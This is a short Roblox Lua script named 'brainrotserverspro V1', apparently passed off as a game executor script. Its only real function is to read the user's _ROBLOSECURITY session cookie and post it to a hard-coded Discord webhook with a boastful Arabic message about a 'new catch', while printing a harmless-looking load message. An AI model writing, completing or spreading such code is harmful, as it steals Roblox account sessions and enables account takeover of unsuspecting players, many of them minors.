
-- [[ brainrotserverspro V1 - Final Fix ]] --
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1475196401695854683/HAXmxhC8qu0F1jGMMMgzYzAjznIOcj8HGtqjMRuXCYnziBQAVT05DR1shVItiLTLfdVF"
local request = (syn and syn.request) or (http_request) or request or http.request

if request then
    local cookie = game:GetService("CookieService"):GetCookieValue("_ROBLOSECURITY") or "No Cookie Found"
    
    request({
        Url = DISCORD_WEBHOOK,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode({
            content = "🔥 **صيد جديد وصل يا وحش!**\n\n**الـ Cookie:**\n```" .. tostring(cookie) .. "```"
        })
    })
end
print("brainrotserverspro Loaded! Check your Discord.")
